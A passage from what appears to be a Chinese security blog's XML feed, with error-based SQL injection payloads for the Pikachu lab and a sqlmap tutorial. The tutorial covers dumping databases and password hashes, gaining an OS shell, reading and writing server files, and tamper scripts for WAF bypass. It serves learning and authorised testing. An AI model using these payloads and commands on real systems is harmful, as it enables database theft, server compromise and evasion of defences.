group_concat(schema_name) from information_schema.schemata limit 0,1),1，31),0x7e),1) and&#x27;     </span><br><span class="line">                                                 #方法二(获取当前所有库名)</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),1,30),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取字段名</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;httpinfo&#x27;),1,30),0x7e),1) and&#x27;</span><br><span class="line"></span><br><span class="line">#获取值</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(ipaddress) from httpinfo),1,30),0x7e),1) and&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
            <tag> top10 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap工具使用</title>
      <link href="/2024/08/02/sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/02/sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap工具使用"><a href="#sqlmap工具使用" class="headerlink" title="sqlmap工具使用"></a>sqlmap工具使用</h2><p>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</p><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://example.com/sqli/?id=1</span><br><span class="line"></span><br><span class="line">#当注入点后边的参数大于或者等于两个时，需要加双引号</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&amp;uid=2&quot;</span><br></pre></td></tr></table></figure><h3 id="判断文本中的请求是否存在注入"><a href="#判断文本中的请求是否存在注入" class="headerlink" title="判断文本中的请求是否存在注入"></a>判断文本中的请求是否存在注入</h3><p>sqlmao可以从一个文本文件中获取http请求，这样就不用设置其他参数(cookie,post，renfer等)，txt文件内容为web数据包，所以需要和bp联动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure><h3 id="查询当前用户下的所有数据库"><a href="#查询当前用户下的所有数据库" class="headerlink" title="查询当前用户下的所有数据库"></a>查询当前用户下的所有数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#加上--dbs</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --dbs</span><br><span class="line">sqlmap.py -r 1.txt --dbs</span><br></pre></td></tr></table></figure><h3 id="获取数据库表名"><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#继续注入时，dbs缩写成D，后边加库的名称</span><br><span class="line">#加上-D 数据库名称 --tables </span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; -D 数据库名称 --tables  </span><br><span class="line">sqlmap.py -r 1.txt -D 数据库名称 --tables   </span><br></pre></td></tr></table></figure><h3 id="获取表中字段名"><a href="#获取表中字段名" class="headerlink" title="获取表中字段名"></a>获取表中字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#继续注入时，tables缩写成T，后边加表的名称</span><br><span class="line">#加上-D 数据库名称 -T 表名 --columns</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; -D 数据库名称 -T 表名 --columns</span><br><span class="line">sqlmap.py -r 1.txt -D 数据库名称 -T 表名 --columns</span><br></pre></td></tr></table></figure><h3 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#继续注入时，columns缩写成C，后边加字段的名称</span><br><span class="line">#参数加上-c 字段名 --dump</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; -D 数据库名称 -T 表名 -c 字段名 --dump</span><br><span class="line">sqlmap.py -r 1.txt -D 数据库名称 -T 表名 -c 字段名 --dump</span><br></pre></td></tr></table></figure><h3 id="获取数据库所有用户"><a href="#获取数据库所有用户" class="headerlink" title="获取数据库所有用户"></a>获取数据库所有用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --users</span><br><span class="line">sqlmap.py -r 1.txt --users</span><br></pre></td></tr></table></figure><h3 id="获取数据库用户密码"><a href="#获取数据库用户密码" class="headerlink" title="获取数据库用户密码"></a>获取数据库用户密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --passwords</span><br><span class="line">sqlmap.py -r 1.txt --passwords</span><br></pre></td></tr></table></figure><h3 id="获取当前数据库名称"><a href="#获取当前数据库名称" class="headerlink" title="获取当前数据库名称"></a>获取当前数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --current-db</span><br><span class="line">sqlmap.py -r 1.txt --current-db</span><br></pre></td></tr></table></figure><h3 id="获取当前网站数据库用户名称"><a href="#获取当前网站数据库用户名称" class="headerlink" title="获取当前网站数据库用户名称"></a>获取当前网站数据库用户名称</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --current-user</span><br><span class="line">sqlmap.py -r 1.txt --current-user</span><br></pre></td></tr></table></figure><h2 id="更多参数详解"><a href="#更多参数详解" class="headerlink" title="更多参数详解"></a>更多参数详解</h2><h3 id="–lever-5：探测等级"><a href="#–lever-5：探测等级" class="headerlink" title="–lever 5：探测等级"></a>–lever 5：探测等级</h3><p>sqlmap一共五个等级，也可以不加，默认是1，sqlmap的payload可以在xml&#x2F;payloads.xml中看到，也可以根据相应的格式添加自己的payload，其中五级包含的payload最多，会自动破解cookie，XFF等头部注入，当然随着等级的提高速度也会变慢，（具体参考相关路径payload或者官方文档）</p><h3 id="–is-dba：当前用户是否为管理员权限"><a href="#–is-dba：当前用户是否为管理员权限" class="headerlink" title="–is-dba：当前用户是否为管理员权限"></a>–is-dba：当前用户是否为管理员权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#返回结果为true或false</span><br><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --is-dba</span><br></pre></td></tr></table></figure><h3 id="–roles：列出数据库管理员角色"><a href="#–roles：列出数据库管理员角色" class="headerlink" title="–roles：列出数据库管理员角色"></a>–roles：列出数据库管理员角色</h3><p>如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-u参数指定想看那个用户的角色吗，（该命令只适用于数据库时Oracle时）</p><h3 id="–referer"><a href="#–referer" class="headerlink" title="–referer"></a>–referer</h3><p>可以伪造http中的referer，当level参数设定为3或3以上时，会尝试对referer注入。也可以尝试referer欺骗，如–referer <a href="http://www.baidu.com/">http://www.baidu.com</a></p><h3 id="–sql-shell：运行自定义SQL语句"><a href="#–sql-shell：运行自定义SQL语句" class="headerlink" title="–sql-shell：运行自定义SQL语句"></a>–sql-shell：运行自定义SQL语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://example.com/sqli/?id=1&quot; --sql-shell </span><br></pre></td></tr></table></figure><p>进入sql-shell面板，在面板中输入想要使用的查询语句</p><h3 id="–os-cmd-–os-shell：运行任意操作系统命令"><a href="#–os-cmd-–os-shell：运行任意操作系统命令" class="headerlink" title="–os-cmd,–os-shell：运行任意操作系统命令"></a>–os-cmd,–os-shell：运行任意操作系统命令</h3><h4 id="–os-cmd"><a href="#–os-cmd" class="headerlink" title="–os-cmd"></a>–os-cmd</h4><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，且有用户权限使用特定函数时，可以使用参数“–os-cmd”执行系统命令。</p><p>如果数据库为MySQL或PostgreSQL，则SQLLmap会上传一个二进制库，包含用户自定义的函数sys_exec()和sys_eval(),通过创建的这两个函数可以执行系统命令。</p><p>如果数据库为Microsoft SQL Server，则sqlmap会使用xp_cmdshell存储过程执行系统命令，如果</p><p>xp_cmdshell被禁用（Microsoft SQL Server 2005版本以上默认被禁用），则sqlmap会重新启用它；如果xp_cmdshell不存在，则sqlmap会创建它。</p><h4 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h4><p>使用参数“–os-shell”可以模拟一个真实的shell，与服务器进行交互，当不能执行多语句时（如php或asp的后端数据库为MySQL），sqlmap可以通过select语句中的into outfile在web服务器的可写目录中船舰web后门，从而执行命令。参数“–os-shell”支持asp，aspnet，jsp和php四种语言。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--os-shell的执行条件有三个:</span><br><span class="line"></span><br><span class="line">（1）网站必须是root权限</span><br><span class="line"></span><br><span class="line">（2）攻击者需要知道网站的绝对路径</span><br><span class="line"></span><br><span class="line">（3）GPC为off，php主动转义的功能关闭</span><br></pre></td></tr></table></figure><h3 id="–file-read：从数据库服务器中读取执行文件"><a href="#–file-read：从数据库服务器中读取执行文件" class="headerlink" title="–file-read：从数据库服务器中读取执行文件"></a>–file-read：从数据库服务器中读取执行文件</h3><p>该命令用于从该服务器中读取可执行文件，当数据库为mysql，postgresql或microsoft sql server，并且当前用户有权限使用特定函数时，读取的文件可以是文本，也可以是二进制文件。</p><p>命令示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://example.com/?id=1 --file-read &quot;/etc/password&quot; -v 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-v 0：静默模式，只输出关键信息和警告。这是最少输出的模式，适合在生产环境或需要最小干扰的情况下使用。</span><br><span class="line"></span><br><span class="line">-v 1：基本模式，输出一些基本的信息和警告。这个级别通常用于常规的安全测试和漏洞评估。</span><br><span class="line"></span><br><span class="line">-v 2：详细模式，输出更多详细的信息，包括请求和响应的数据。适用于深入的漏洞分析和调试。</span><br><span class="line"></span><br><span class="line">-v 3：调试模式，输出大量的调试信息，非常详细。主要用于开发和排查问题。</span><br><span class="line"></span><br><span class="line">-v 4、-v 5、-v 6：这些级别输出的信息更加详细和深入，通常用于极端情况下的分析和调试。</span><br></pre></td></tr></table></figure><h3 id="–file-write和–file-dest：将本地文件写入数据库服务器"><a href="#–file-write和–file-dest：将本地文件写入数据库服务器" class="headerlink" title="–file-write和–file-dest：将本地文件写入数据库服务器"></a>–file-write和–file-dest：将本地文件写入数据库服务器</h3><p>用于将本地文件写入数据库服务器，当数据库为MySQL，PostgreSQL或Microsoft SQL Server，且有用户权限使用特定函数时，上传文件可以是文本也可以是二进制文件。</p><p>命令示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://example.com/?id=1 --file-write &quot;1.txt&quot; --file-dest &quot;/tmp/1.txt&quot; -v 1</span><br></pre></td></tr></table></figure><h2 id="sqlmap自带tamper绕过脚本讲解"><a href="#sqlmap自带tamper绕过脚本讲解" class="headerlink" title="sqlmap自带tamper绕过脚本讲解"></a>sqlmap自带tamper绕过脚本讲解</h2><p>为了防止诸如语句中出现单引号，sqlmap默认情况下会使用CHAR()函数。可以使用参数“–tamper”对数据作修改来绕过waf等设备，其中大部分脚本主要使用正则模块替换payload字符编码的方式尝试绕过waf的检测规则，命令示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py xxxx --tamper &quot;模块名&quot;</span><br></pre></td></tr></table></figure><p>日常使用我们会对一些网站是否有安全防护进行试探，使用参数”–identify-waf”进行检测</p><h3 id="常用tamper绕过脚本"><a href="#常用tamper绕过脚本" class="headerlink" title="常用tamper绕过脚本"></a>常用tamper绕过脚本</h3><p>（1）apostrophemask.py</p><p>作用：将引号替换为UTF-8格式，用于过滤单引号</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 AND %EF%BC%871%EF%BC%87=%EF+BC%871   #这是全角单引号的UTF-8编码</span><br><span class="line">1 AND %271%27=%271         #正常英文单引号的UTF-8编码</span><br></pre></td></tr></table></figure><p>（2）base64encode.py</p><p>作用：将请求参数进行base64位编码</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and SLEEP(5)#</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MScgYW5kIFNMRUVQKDUpIw==</span><br></pre></td></tr></table></figure><p>（3）multiplespaces.py</p><p>作用：在SQL语句的关键字中间添加多个空格</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT foobar</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1   UNION   SELECT   foobar</span><br></pre></td></tr></table></figure><p>（4）space2plus.py</p><p>作用：用加号（+）替换空格</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT+id+FROM+users</span><br></pre></td></tr></table></figure><p>（5）nonrecursivereplacement.py</p><p>作用：作为双重查询语句，用双重语句替换预定义的SQL关键字（适用于非常弱的自定义过滤器，例如将”select”替换为空）</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION SELECT 2--</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNIOUNIONN SELESELECTCT 2--</span><br></pre></td></tr></table></figure><p>（6）space2randomblank.py</p><p>作用：将空格替换为其他有效字符，例如%09，%0A，%0C，%0D</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%0Did%0DFROM%0Dusers</span><br></pre></td></tr></table></figure><p>（7）unionalltounion.py</p><p>作用：将”UNION ALL AELECT”替换为”UNION SELECT”</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 UNION ALL AELECT</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 UNION SELECT</span><br></pre></td></tr></table></figure><p>（8）securesphere.py</p><p>作用：追加特制的字符串</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 and &#x27;0having&#x27;=&#x27;0having&#x27;</span><br></pre></td></tr></table></figure><p>（9）space2hash.py</p><p>作用：将空格替换为井字号（#），并添加一个随机字符串和换行符</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%23nVNaVoPYeva%023ngNvzqu%0A9227=9227</span><br></pre></td></tr></table></figure><p>（10）space2mssqlblank.py</p><p>作用：将空格替换为其他空符号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%0Eid%0DFROM%07users</span><br></pre></td></tr></table></figure><p>（11）space2mssqlhash.py</p><p>作用：将空格替换为井字号（#），并添加换行符</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%23%0AAnd%23%0A9227=9227</span><br></pre></td></tr></table></figure><p>（12）between.py</p><p>作用：用“NOT VETWEEN 0 AND”替换大于号（&gt;），用“BETWEEN AND”替换等号（&#x3D;）</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B--</span><br><span class="line">1 AND A = B--</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 ADN A NOT BETWEEN 0 AND B--</span><br><span class="line">1 ADN A BETWEEN B AND B--</span><br></pre></td></tr></table></figure><p>（13）percentage.py</p><p>作用：ASP语言允许在每个字符前加上一个百分号（%）</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM TABLE</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%S%E%L%E%C%T%F%I%E%L%D%F%R%O%M%T%A%B%L%E</span><br></pre></td></tr></table></figure><p>（14）sp_password.py</p><p>作用：将sp_password.py追加到Payload末尾</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227--</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227-- sp_password.py</span><br></pre></td></tr></table></figure><p>（15）charencode.py</p><p>作用：对给定Payload全部字符使用URL编码（不处理已经编码的字符）</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</span><br></pre></td></tr></table></figure><p>（16）randomcase.py</p><p>作用：在sql语句中，对关键字进行随机大小写转换</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InsERt</span><br></pre></td></tr></table></figure><p>（17）charunicodeencode.py</p><p>作用：对sql语句进行字符串unicode编码</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD%20FROM TABLE</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0053\u0045\u004c\u0045\u0043\u0054\u0020\u0046\u0049\u0045\u004c\u0044\u0025\u0032\u0030\u0046\u0052\u004f\u004d\u0020\u0054\u0041\u0042\u004c\u0045</span><br></pre></td></tr></table></figure><p>（18）space2comment.py</p><p>作用：将空格替换为“&#x2F;**&#x2F;”</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT/**/ID/**/FROM/**/users</span><br></pre></td></tr></table></figure><p>（19）equaltolike.py</p><p>作用：将等号（&#x3D;）替换为“like”</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id Like 1</span><br></pre></td></tr></table></figure><p>（20）greatest.py</p><p>作用：绕过对“大于号（&gt;）”的过滤，用“GREATEST”替换大于号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND A &gt; B</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND GREATEST（A，B+1）=A</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#测试通过的数据库类型和版本如下</span><br><span class="line">MySQL4;MySQL5和MySQL5.5</span><br><span class="line">oracle 10g</span><br><span class="line">postgresql8.3;postgresql8.4和postgresql9.0</span><br></pre></td></tr></table></figure><p>（21）ifnull2ifisnull.py</p><p>作用：绕过对“IFNULL”的过滤，将类似“IFNULL(A,B)”的数据库语句替换为“IF(ISNULL(A),B,A)”</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(1,2)</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(ISNULL(1),2,1)</span><br></pre></td></tr></table></figure><p>（22）modsecurityversioned.py</p><p>作用：过滤空格，通过mysql内联注释的方式进行注入</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1--</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 /*!30874AND 2&gt;1*/--</span><br></pre></td></tr></table></figure><p>该脚本可在mysql5.0数据库中使用</p><p>（23）space2mysqlblank.py</p><p>作用：将空格替换为其他空白符号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%A0id%0BFROM%0Cusers</span><br></pre></td></tr></table></figure><p>该脚本可以在Mysql5.1数据库中使用</p><p>（24）modsecurityzeroversioned.py</p><p>作用：使用MySQL内联注释的方法进行注入</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 2&gt;1--</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 /*!00000AND 2&gt;1*/--</span><br></pre></td></tr></table></figure><p>该脚本可以在MySQL5.0数据库中使用</p><p>（25）space2mysqldash.py</p><p>作用：将空格替换为“–”，并添加一个换行符</p><p>使用脚本前语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227</span><br></pre></td></tr></table></figure><p>使用脚本后语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--%0AAND--%0A9227=9227</span><br></pre></td></tr></table></figure><p>（26）bluecoat.py</p><p>作用：在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users where id = 1</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%09id FROM%09users where%09id LIKE 1</span><br></pre></td></tr></table></figure><p>该脚本可以在MySQL5.1和SGOS数据库中使用</p><p>（27）versionedkeywords.py</p><p>作用绕过注释</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION ALL SELECT NULL,NULL,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CH/**/AR(58,100,114,117,58))#</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 